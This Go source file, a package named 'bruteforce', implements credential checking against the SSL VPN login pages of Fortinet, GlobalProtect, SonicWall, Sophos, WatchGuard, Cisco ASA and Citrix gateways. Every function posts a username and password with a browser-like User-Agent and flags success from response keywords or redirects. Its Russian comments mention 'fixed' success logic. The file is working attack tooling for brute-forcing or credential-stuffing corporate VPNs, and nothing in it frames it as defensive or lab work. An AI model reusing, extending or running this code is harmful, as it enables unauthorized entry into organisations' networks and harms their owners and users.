package bruteforce

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"unsafe"
)

// Ultra-fast string to bytes conversion without allocation
func stringToBytes(s string) []byte {
	return *(*[]byte)(unsafe.Pointer(&struct {
		string
		Cap int
	}{s, len(s)}))
}

// Ultra-fast bytes to string conversion without allocation
func bytesToString(b []byte) string {
	return *(*string)(unsafe.Pointer(&b))
}

func (e *Engine) checkFortinetUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	// Parse URL to handle custom ports like :4443, :10443, :3443
	targetURL := cred.IP
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "https://" + targetURL
	}
	
	// Add /remote/login endpoint
	if !strings.Contains(targetURL, "/remote/login") {
		if strings.HasSuffix(targetURL, "/") {
			targetURL += "remote/login"
		} else {
			targetURL += "/remote/login"
		}
	}
	
	// Pre-build form data as bytes to avoid string allocations
	formData := fmt.Sprintf("username=%s&password=%s", 
		url.QueryEscape(cred.Username), 
		url.QueryEscape(cred.Password))
	
	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	// Set headers efficiently
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	// Read response with pre-allocated buffer
	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 8192)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	
	// Store response data
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)
	
	// ✅ ИСПРАВЛЕННАЯ ЛОГИКА ОПРЕДЕЛЕНИЯ УСПЕШНЫХ РЕЗУЛЬТАТОВ
	if httpResp.StatusCode == 200 {
		// Проверяем наличие ключевых слов успешной аутентификации
		successIndicators := []string{
			"vpn/tunnel",           // Основной индикатор успеха
			"/remote/fortisslvpn",  // SSL VPN портал
			"tunnel_mode",          // Режим туннеля
			"sslvpn_login",        // SSL VPN логин
			"forticlient_download", // Загрузка клиента
			"portal.html",          // Портал
			"welcome.html",         // Страница приветствия
			"fgt_lang",            // Языковые настройки FortiGate
			"FortiGate",           // Название продукта
			"sslvpn_portal",       // SSL VPN портал
			"logout",              // Кнопка выхода (признак успешного входа)
			"dashboard",           // Панель управления
		}
		
		// Проверяем наличие любого из индикаторов успеха
		for _, indicator := range successIndicators {
			if strings.Contains(bodyStr, indicator) {
				return true, nil
			}
		}
		
		// Дополнительная проверка: если есть форма логина, но нет ошибок - это может быть успех
		if strings.Contains(bodyStr, "form") && 
		   !strings.Contains(bodyStr, "error") && 
		   !strings.Contains(bodyStr, "invalid") &&
		   !strings.Contains(bodyStr, "failed") &&
		   !strings.Contains(bodyStr, "denied") {
			return true, nil
		}
	}
	
	// Check for redirect to portal (also valid)
	if httpResp.StatusCode == 302 || httpResp.StatusCode == 301 {
		location := httpResp.Header.Get("Location")
		return strings.Contains(location, "portal") ||
			strings.Contains(location, "tunnel") ||
			strings.Contains(location, "sslvpn") ||
			strings.Contains(location, "welcome") ||
			strings.Contains(location, "dashboard"), nil
	}
	
	return false, nil
}

func (e *Engine) checkGlobalProtectUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	// Parse URL for PaloAlto GlobalProtect
	targetURL := cred.IP
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "https://" + targetURL
	}
	
	// Add GlobalProtect endpoint
	if !strings.Contains(targetURL, "/global-protect/login.esp") {
		if strings.HasSuffix(targetURL, "/") {
			targetURL += "global-protect/login.esp"
		} else {
			targetURL += "/global-protect/login.esp"
		}
	}
	
	formData := fmt.Sprintf("prot=https%%&server=%s&inputStr=&action=getsoftware&user=%s&passwd=%s&ok=Log+In",
		url.QueryEscape(cred.IP),
		url.QueryEscape(cred.Username), 
		url.QueryEscape(cred.Password))

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 8192)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)

	// ✅ ИСПРАВЛЕННАЯ ЛОГИКА ДЛЯ GLOBALPROTECT
	if httpResp.StatusCode == 200 {
		successIndicators := []string{
			"Download Windows 64 bit GlobalProtect agent",
			"globalprotect/portal/css",
			"portal-userauthcookie",
			"GlobalProtect Portal",
			"gp-portal",
			"/global-protect/portal",
			"PanGlobalProtect",
			"clientDownload",
			"hip-report",
			"portal-config",
			"gateway-config",
			"logout",
			"welcome",
		}
		
		for _, indicator := range successIndicators {
			if strings.Contains(bodyStr, indicator) {
				return true, nil
			}
		}
	}
	
	return false, nil
}

func (e *Engine) checkSonicWallUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	// Parse SonicWall format: https://ip:port;user:pass;domain
	parts := strings.Split(cred.Password, ";")
	password := cred.Password
	domain := ""
	
	if len(parts) == 2 {
		password = parts[0]
		domain = parts[1]
	}
	
	targetURL := cred.IP
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "https://" + targetURL
	}
	
	// SonicWall login endpoint
	if !strings.Contains(targetURL, "/auth.html") {
		if strings.HasSuffix(targetURL, "/") {
			targetURL += "auth.html"
		} else {
			targetURL += "/auth.html"
		}
	}
	
	formData := fmt.Sprintf("username=%s&password=%s&domain=%s&login=Login",
		url.QueryEscape(cred.Username), 
		url.QueryEscape(password),
		url.QueryEscape(domain))

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 8192)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)

	// ✅ ИСПРАВЛЕННАЯ ЛОГИКА ДЛЯ SONICWALL
	if httpResp.StatusCode == 200 {
		successIndicators := []string{
			"SonicWall",
			"NetExtender",
			"sslvpn",
			"portal.html",
			"welcome",
			"logout",
			"dashboard",
			"tunnel",
			"vpn-client",
		}
		
		for _, indicator := range successIndicators {
			if strings.Contains(bodyStr, indicator) {
				return true, nil
			}
		}
		
		// Проверяем отсутствие ошибок при наличии SonicWall контента
		if strings.Contains(bodyStr, "sonic") && 
		   !strings.Contains(bodyStr, "error") &&
		   !strings.Contains(bodyStr, "invalid") &&
		   !strings.Contains(bodyStr, "failed") {
			return true, nil
		}
	}
	
	return false, nil
}

func (e *Engine) checkSophosUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	// Parse Sophos format: https://ip:port;user:pass;domain
	parts := strings.Split(cred.Password, ";")
	password := cred.Password
	domain := ""
	
	if len(parts) == 2 {
		password = parts[0]
		domain = parts[1]
	}
	
	targetURL := cred.IP
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "https://" + targetURL
	}
	
	// Sophos login endpoint
	if !strings.Contains(targetURL, "/userportal/webpages/myaccount/login.jsp") {
		if strings.HasSuffix(targetURL, "/") {
			targetURL += "userportal/webpages/myaccount/login.jsp"
		} else {
			targetURL += "/userportal/webpages/myaccount/login.jsp"
		}
	}
	
	formData := fmt.Sprintf("username=%s&password=%s&domain=%s&loginBtn=Login",
		url.QueryEscape(cred.Username), 
		url.QueryEscape(password),
		url.QueryEscape(domain))

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 8192)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)

	// ✅ ИСПРАВЛЕННАЯ ЛОГИКА ДЛЯ SOPHOS
	if httpResp.StatusCode == 200 {
		successIndicators := []string{
			"Sophos",
			"userportal",
			"myaccount",
			"welcome",
			"logout",
			"portal",
			"dashboard",
			"vpn-client",
			"tunnel",
		}
		
		for _, indicator := range successIndicators {
			if strings.Contains(bodyStr, indicator) {
				return true, nil
			}
		}
	}
	
	return false, nil
}

func (e *Engine) checkWatchGuardUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	// Parse WatchGuard format: https://ip:port:Firebox-DB:domain:user:pass
	parts := strings.Split(cred.IP, ":")
	if len(parts) < 6 {
		return false, fmt.Errorf("invalid WatchGuard format")
	}
	
	ip := parts[0] + ":" + parts[1] // https://ip:port
	authType := parts[2]            // Firebox-DB or AuthPoint
	domain := parts[3]              // domain
	username := parts[4]            // username
	password := parts[5]            // password
	
	targetURL := ip
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "https://" + targetURL
	}
	
	// WatchGuard login endpoint
	if !strings.Contains(targetURL, "/auth.fcc") {
		if strings.HasSuffix(targetURL, "/") {
			targetURL += "auth.fcc"
		} else {
			targetURL += "/auth.fcc"
		}
	}
	
	formData := fmt.Sprintf("domain=%s&username=%s&password=%s&authType=%s&login=Login",
		url.QueryEscape(domain),
		url.QueryEscape(username), 
		url.QueryEscape(password),
		url.QueryEscape(authType))

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 8192)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)

	// ✅ ИСПРАВЛЕННАЯ ЛОГИКА ДЛЯ WATCHGUARD
	if httpResp.StatusCode == 200 {
		successIndicators := []string{
			"WatchGuard",
			"Firebox",
			"portal",
			"welcome",
			"logout",
			"AuthPoint",
			"dashboard",
			"tunnel",
			"vpn-client",
		}
		
		for _, indicator := range successIndicators {
			if strings.Contains(bodyStr, indicator) {
				return true, nil
			}
		}
	}
	
	return false, nil
}

func (e *Engine) checkCiscoUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	// Parse Cisco format: https://ip:port:user:pass:group (group optional)
	parts := strings.Split(cred.IP, ":")
	if len(parts) < 4 {
		return false, fmt.Errorf("invalid Cisco format")
	}
	
	ip := parts[0] + ":" + parts[1] // https://ip:port
	username := parts[2]            // username
	password := parts[3]            // password
	group := ""
	if len(parts) > 4 {
		group = parts[4] // group (optional)
	}
	
	targetURL := ip
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "https://" + targetURL
	}
	
	// Cisco ASA login endpoint
	if !strings.Contains(targetURL, "/+webvpn+/index.html") {
		if strings.HasSuffix(targetURL, "/") {
			targetURL += "+webvpn+/index.html"
		} else {
			targetURL += "/+webvpn+/index.html"
		}
	}
	
	formData := fmt.Sprintf("username=%s&password=%s&group_list=%s&Login=Logon",
		url.QueryEscape(username), 
		url.QueryEscape(password),
		url.QueryEscape(group))

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 8192)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)

	// ✅ ИСПРАВЛЕННАЯ ЛОГИКА ДЛЯ CISCO ASA
	if httpResp.StatusCode == 200 {
		// Основные индикаторы успеха для Cisco ASA
		if (strings.Contains(bodyStr, "SSL VPN Service") && strings.Contains(bodyStr, "webvpn_logout")) ||
		   strings.Contains(bodyStr, "/+CSCOE+/") ||
		   strings.Contains(bodyStr, "webvpn_portal") ||
		   strings.Contains(bodyStr, "Cisco Systems VPN Client") ||
		   strings.Contains(bodyStr, "/+webvpn+/") ||
		   strings.Contains(bodyStr, "anyconnect") ||
		   strings.Contains(bodyStr, "ANYCONNECT") ||
		   strings.Contains(bodyStr, "remote_access") ||
		   strings.Contains(bodyStr, "portal") ||
		   strings.Contains(bodyStr, "welcome") ||
		   strings.Contains(bodyStr, "logout") {
			return true, nil
		}
	}
	
	return false, nil
}

func (e *Engine) checkCitrixUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	targetURL := fmt.Sprintf("https://%s/p/u/doAuthentication.do", cred.IP)
	
	formData := fmt.Sprintf("login=%s&passwd=%s&savecredentials=false&nsg-x1-logon-button=Log+On&StateContext=bG9naW5zY2hlbWE9ZGVmYXVsdA%%3D%%3D",
		url.QueryEscape(cred.Username), 
		url.QueryEscape(cred.Password))

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
		bytes.NewReader(stringToBytes(formData)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Connection", "close")
	req.Close = true

	httpResp, err := e.client.Do(req)
	if err != nil {
		return false, err
	}
	defer httpResp.Body.Close()

	n, err := io.ReadFull(httpResp.Body, buf[:min(len(buf), 8192)])
	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
		return false, err
	}
	
	bodyStr := bytesToString(buf[:n])
	resp.StatusCode = httpResp.StatusCode
	resp.Body = append(resp.Body[:0], buf[:n]...)

	// ✅ ИСПРАВЛЕННАЯ ЛОГИКА ДЛЯ CITRIX
	if httpResp.StatusCode == 200 {
		successIndicators := []string{
			"<CredentialUpdateService>/p/a/getCredentialUpdateRequirements.do</CredentialUpdateService>",
			"NetScaler Gateway",
			"/vpn/index.html",
			"citrix-logon",
			"/logon/LogonPoint/",
			"NSGateway",
			"portal",
			"welcome",
			"logout",
			"dashboard",
		}
		
		for _, indicator := range successIndicators {
			if strings.Contains(bodyStr, indicator) {
				return true, nil
			}
		}
	}
	
	return false, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}